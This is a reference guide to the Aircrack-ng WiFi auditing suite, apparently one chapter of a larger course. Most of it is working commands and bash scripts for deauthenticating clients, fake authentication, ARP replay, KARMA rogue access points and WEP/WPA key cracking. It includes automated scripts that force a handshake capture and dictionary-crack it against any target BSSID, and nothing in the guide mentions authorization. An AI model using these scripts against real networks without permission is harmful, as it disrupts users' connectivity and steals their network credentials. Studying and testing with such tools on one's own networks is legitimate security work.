# Aircrack-ng Suite Complete Reference

## Overview

Aircrack-ng is the most comprehensive WiFi security auditing toolkit. This guide covers every tool in the suite with practical examples.

---

## Suite Components

```
┌─────────────────────────────────────────────────────────────┐
│                 AIRCRACK-NG SUITE                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   MONITORING                        ATTACKING               │
│   ──────────                        ─────────               │
│   airmon-ng   - Interface modes     aireplay-ng - Injection │
│   airodump-ng - Packet capture      packetforge-ng - Create │
│   airolib-ng  - PMK database        airtun-ng   - Tunnels   │
│                                                              │
│   CRACKING                          UTILITIES               │
│   ────────                          ─────────               │
│   aircrack-ng - Key recovery        airbase-ng  - Fake AP   │
│   airdecap-ng - Decrypt captures    airdecloak-ng - Decloak │
│                                     airserv-ng  - Server    │
│                                     ivstools    - IV merge  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## airmon-ng - Monitor Mode Management

### Purpose
Enable/disable monitor mode on wireless interfaces.

### Syntax
```bash
airmon-ng [check|check kill|start|stop] [interface] [channel]
```

### Commands

```bash
# Check for interfering processes
airmon-ng check

# Kill interfering processes
airmon-ng check kill

# Start monitor mode
airmon-ng start wlan0

# Start on specific channel
airmon-ng start wlan0 6

# Stop monitor mode
airmon-ng stop wlan0mon

# List wireless interfaces
airmon-ng
```

### Example Script

```bash
#!/bin/bash
# Safe monitor mode enablement

INTERFACE="wlan1"

enable_monitor() {
    # Kill interfering processes
    airmon-ng check kill 2>/dev/null

    # Start monitor mode
    airmon-ng start "$INTERFACE" 2>/dev/null

    # Determine monitor interface name
    if ip link show "${INTERFACE}mon" >/dev/null 2>&1; then
        echo "${INTERFACE}mon"
    elif ip link show "$INTERFACE" >/dev/null 2>&1; then
        echo "$INTERFACE"
    else
        echo "ERROR"
        return 1
    fi
}

disable_monitor() {
    airmon-ng stop "${INTERFACE}mon" 2>/dev/null
    airmon-ng stop "$INTERFACE" 2>/dev/null
}

# Usage
MON=$(enable_monitor)
echo "Monitor interface: $MON"

# ... do work ...

disable_monitor
```

---

## airodump-ng - Packet Capture & Analysis

### Purpose
Capture raw 802.11 frames and display network/client information.

### Syntax
```bash
airodump-ng [options] <interface>
```

### Key Options

| Option | Description |
|--------|-------------|
| `-c <channel>` | Lock to specific channel |
| `--bssid <mac>` | Filter by AP MAC |
| `--essid <name>` | Filter by network name |
| `-w <prefix>` | Write capture to file |
| `-o <format>` | Output format (pcap,csv,kismet) |
| `--band <band>` | a=5GHz, bg=2.4GHz |
| `--write-interval <sec>` | Save interval |
| `--wps` | Display WPS info |
| `-a` | Show associated clients only |

### Common Usage

```bash
# Basic scan (all channels)
airodump-ng wlan0mon

# Scan specific channel
airodump-ng -c 6 wlan0mon

# Target specific AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Write capture to file
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Scan 5GHz only
airodump-ng --band a wlan0mon

# Multiple output formats
airodump-ng -w scan --output-format pcap,csv,netxml wlan0mon

# Show WPS information
airodump-ng --wps wlan0mon
```

### Output Understanding

```
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45      123      456   12   6   54e  WPA2 CCMP   PSK  NetworkName

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -52    0 -24     10       50         HomeNet,Work
```

| Field | Meaning |
|-------|---------|
| BSSID | AP MAC address |
| PWR | Signal strength (dBm) |
| Beacons | Beacon frames received |
| #Data | Data frames captured |
| CH | Channel |
| MB | Max speed (e=802.11n) |
| ENC | Encryption (OPN/WEP/WPA/WPA2) |
| CIPHER | Cipher (TKIP/CCMP) |
| AUTH | Authentication (PSK/MGT) |
| STATION | Client MAC |
| Probes | Networks client is looking for |

### Capture Script

```bash
#!/bin/bash
# Comprehensive network capture

INTERFACE="wlan1mon"
OUTPUT_DIR="/sd/loot/captures"
DURATION=300

mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')

# All networks
timeout $DURATION airodump-ng \
    -w "$OUTPUT_DIR/full_$TIMESTAMP" \
    --output-format pcap,csv,netxml \
    --write-interval 10 \
    "$INTERFACE"

# Parse results
echo "=== Captured Networks ==="
grep -E "^[0-9A-Fa-f]" "$OUTPUT_DIR/full_${TIMESTAMP}-01.csv" | \
    cut -d',' -f1,4,6,14 | head -20
```

---

## aireplay-ng - Packet Injection

### Purpose
Inject packets to generate traffic or perform attacks.

### Syntax
```bash
aireplay-ng [attack_mode] [options] <interface>
```

### Attack Modes

| Mode | Number | Description |
|------|--------|-------------|
| Deauth | -0 | Deauthentication attack |
| Fake Auth | -1 | Associate with AP |
| Interactive | -2 | Choose packet to replay |
| ARP Replay | -3 | Replay ARP for IVs |
| KoreK ChopChop | -4 | WEP attack |
| Fragmentation | -5 | WEP attack |
| Cafe-Latte | -6 | WEP client attack |
| Hirte | -7 | WEP client attack |
| Test | -9 | Injection test |

### Deauthentication Attack

```bash
# Deauth all clients from AP (5 bursts)
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Continuous deauth (0 = infinite)
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Fake Authentication

```bash
# Associate with WEP AP
aireplay-ng --fakeauth 0 -e "TargetNetwork" -a AA:BB:CC:DD:EE:FF -h OUR_MAC wlan0mon

# Keep-alive fake auth (every 10 seconds)
aireplay-ng --fakeauth 10 -e "TargetNetwork" -a AA:BB:CC:DD:EE:FF -h OUR_MAC wlan0mon
```

### ARP Replay (WEP)

```bash
# Wait for and replay ARP packets
aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h OUR_MAC wlan0mon
```

### Injection Test

```bash
# Test if injection works
aireplay-ng --test wlan0mon

# Test against specific AP
aireplay-ng --test -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Deauth Script

```bash
#!/bin/bash
# Smart deauthentication for handshake capture

TARGET_AP="$1"
TARGET_CLIENT="${2:-}"
INTERFACE="wlan1mon"

if [ -z "$TARGET_AP" ]; then
    echo "Usage: $0 <AP_BSSID> [CLIENT_MAC]"
    exit 1
fi

# Send deauth bursts with delay
for i in {1..3}; do
    echo "Deauth burst $i..."

    if [ -n "$TARGET_CLIENT" ]; then
        aireplay-ng --deauth 5 -a "$TARGET_AP" -c "$TARGET_CLIENT" "$INTERFACE"
    else
        aireplay-ng --deauth 5 -a "$TARGET_AP" "$INTERFACE"
    fi

    # Random delay between bursts
    sleep $((RANDOM % 10 + 5))
done

echo "Deauth complete"
```

---

## aircrack-ng - Key Cracking

### Purpose
Recover WEP/WPA keys from captured data.

### Syntax
```bash
aircrack-ng [options] <capture_file(s)>
```

### Key Options

| Option | Description |
|--------|-------------|
| `-w <wordlist>` | Dictionary file |
| `-b <bssid>` | Target BSSID |
| `-e <essid>` | Target ESSID |
| `-a <mode>` | Force mode (1=WEP, 2=WPA) |
| `-n <bits>` | WEP key length (64/128) |
| `-K` | Use KoreK attacks |
| `-p <threads>` | CPU threads |
| `-l <file>` | Write key to file |
| `-q` | Quiet mode |

### WEP Cracking

```bash
# Auto-detect and crack WEP
aircrack-ng capture-01.cap

# Force 128-bit WEP
aircrack-ng -n 128 capture-01.cap

# Use KoreK attacks
aircrack-ng -K capture-01.cap

# Specify BSSID
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### WPA/WPA2 Cracking

```bash
# Dictionary attack
aircrack-ng -w /path/to/wordlist.txt capture-01.cap

# Specify target
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Multiple wordlists
aircrack-ng -w list1.txt,list2.txt,list3.txt capture-01.cap

# Multi-threaded
aircrack-ng -w wordlist.txt -p 4 capture-01.cap

# Save key to file
aircrack-ng -w wordlist.txt -l found_key.txt capture-01.cap
```

### Crack Script

```bash
#!/bin/bash
# Automated WPA crack attempt

CAPTURE="$1"
WORDLIST="${2:-/sd/wordlists/rockyou.txt}"

if [ ! -f "$CAPTURE" ]; then
    echo "Usage: $0 <capture.cap> [wordlist]"
    exit 1
fi

# Check for handshake
if ! aircrack-ng "$CAPTURE" 2>/dev/null | grep -q "handshake"; then
    echo "No valid handshake found in capture"
    exit 1
fi

echo "Starting crack attempt..."
echo "Capture: $CAPTURE"
echo "Wordlist: $WORDLIST"

aircrack-ng -w "$WORDLIST" -l /tmp/key.txt "$CAPTURE"

if [ -f /tmp/key.txt ]; then
    echo "KEY FOUND:"
    cat /tmp/key.txt
fi
```

---

## airbase-ng - Rogue Access Point

### Purpose
Create fake access points for attacks.

### Syntax
```bash
airbase-ng [options] <interface>
```

### Key Options

| Option | Description |
|--------|-------------|
| `-e <essid>` | SSID name |
| `-c <channel>` | Channel |
| `-a <bssid>` | Set BSSID |
| `-P` | Respond to all probes (KARMA) |
| `-C <sec>` | Beacon interval |
| `-Z <type>` | WPA type |
| `-W <0/1>` | WEP encryption |

### Examples

```bash
# Simple open AP
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# KARMA attack (respond to all probes)
airbase-ng -e "FreeWiFi" -c 6 -P wlan0mon

# WPA2 AP
airbase-ng -e "SecureNet" -c 6 -Z 2 wlan0mon
```

---

## airdecap-ng - Decrypt Captures

### Purpose
Decrypt WEP/WPA encrypted captures.

### Syntax
```bash
airdecap-ng [options] <capture>
```

### Examples

```bash
# Decrypt WEP capture
airdecap-ng -w 0123456789ABCDEF capture-01.cap

# Decrypt WPA capture
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Output: capture-01-dec.cap (decrypted traffic)
```

---

## packetforge-ng - Create Packets

### Purpose
Create encrypted packets for injection.

### Syntax
```bash
packetforge-ng [options] <output>
```

### Examples

```bash
# Create ARP packet for WEP
packetforge-ng --arp \
    -a AA:BB:CC:DD:EE:FF \
    -h OUR_MAC \
    -k 255.255.255.255 \
    -l 255.255.255.255 \
    -y fragment.xor \
    -w arp.cap
```

---

## Complete Attack Scripts

### WEP Crack Automation

```bash
#!/bin/bash
# Automated WEP cracking

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
INTERFACE="wlan1"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    echo "Usage: $0 <BSSID> <CHANNEL>"
    exit 1
fi

# Setup
airmon-ng check kill
airmon-ng start "$INTERFACE"
MON="${INTERFACE}mon"

# Start capture
airodump-ng -c "$TARGET_CHANNEL" \
    --bssid "$TARGET_BSSID" \
    -w /tmp/wep \
    "$MON" &

sleep 5

# Get our MAC
OUR_MAC=$(cat /sys/class/net/$MON/address)

# Fake auth
aireplay-ng --fakeauth 0 -a "$TARGET_BSSID" -h "$OUR_MAC" "$MON" &

# ARP replay
aireplay-ng --arpreplay -b "$TARGET_BSSID" -h "$OUR_MAC" "$MON" &

# Wait for IVs
echo "Collecting IVs... (Ctrl+C when enough)"
wait

# Crack
aircrack-ng /tmp/wep-01.cap
```

### WPA Handshake + Crack

```bash
#!/bin/bash
# WPA handshake capture and crack

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
WORDLIST="${3:-/sd/wordlists/rockyou.txt}"
INTERFACE="wlan1"

# Setup monitor mode
airmon-ng check kill
airmon-ng start "$INTERFACE"
MON="${INTERFACE}mon"

# Capture
airodump-ng -c "$TARGET_CHANNEL" \
    --bssid "$TARGET_BSSID" \
    -w /tmp/wpa \
    "$MON" &

CAP_PID=$!
sleep 10

# Deauth
aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON"

# Wait for handshake
sleep 30
kill $CAP_PID 2>/dev/null

# Check and crack
if aircrack-ng /tmp/wpa-01.cap 2>/dev/null | grep -q "handshake"; then
    echo "Handshake captured! Starting crack..."
    aircrack-ng -w "$WORDLIST" /tmp/wpa-01.cap
else
    echo "No handshake captured"
fi

# Cleanup
airmon-ng stop "$MON"
```

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│               AIRCRACK-NG QUICK REFERENCE                   │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  MONITOR MODE:                                              │
│    airmon-ng start wlan0          # Enable                  │
│    airmon-ng stop wlan0mon        # Disable                 │
│                                                              │
│  SCANNING:                                                   │
│    airodump-ng wlan0mon           # All networks            │
│    airodump-ng -c 6 wlan0mon      # Channel 6              │
│    airodump-ng -w cap wlan0mon    # Save capture           │
│                                                              │
│  DEAUTH:                                                     │
│    aireplay-ng -0 5 -a BSSID if   # 5 deauths             │
│    aireplay-ng -0 0 -a BSSID if   # Continuous            │
│                                                              │
│  CRACKING:                                                   │
│    aircrack-ng capture.cap        # Check/crack WEP        │
│    aircrack-ng -w list capture    # WPA dictionary        │
│                                                              │
│  FAKE AP:                                                    │
│    airbase-ng -e SSID -c 6 if     # Simple AP             │
│    airbase-ng -e SSID -P if       # KARMA                 │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

[← Software Architecture](02_Software_Architecture.md) | [Back to Fundamentals](README.md) | [Next: Network Tools →](04_Network_Tools.md)
